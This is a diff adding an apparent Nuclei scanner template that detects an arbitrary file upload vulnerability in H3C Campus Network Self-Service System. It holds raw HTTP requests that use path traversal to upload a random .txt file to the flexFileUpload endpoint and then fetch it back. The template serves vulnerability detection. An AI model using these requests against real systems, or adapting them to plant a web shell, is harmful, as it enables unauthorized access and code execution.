@@ -1,0 +1,52 @@
+id: h3c-flexfileupload-file-upload
+info:
+  name: H3C FlexFileUpload Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    H3C Campus Network Self-Service System flexFileUpload endpoint is vulnerable to arbitrary file upload which can lead to unauthorized access or remote code execution.
+
+variables:
+  name: '{{rand_base(6)}}'
+  content: '{{rand_base(16)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q
+
+        -----------------WebKitFormBoundaryMmx988TUuintqO4Q
+        Content-Disposition: form-data; name="{{name}}.txt"; filename="{{name}}.txt"
+        Content-Type: application/octet-stream
+
+        {{content}}
+        -----------------WebKitFormBoundaryMmx988TUuintqO4Q--
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "imc"
+        part: header
+
+  - raw:
+      - |
+        GET /imc/primepush/%2e%2e/flex/topobg/{{name}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{content}}"
+        part: body
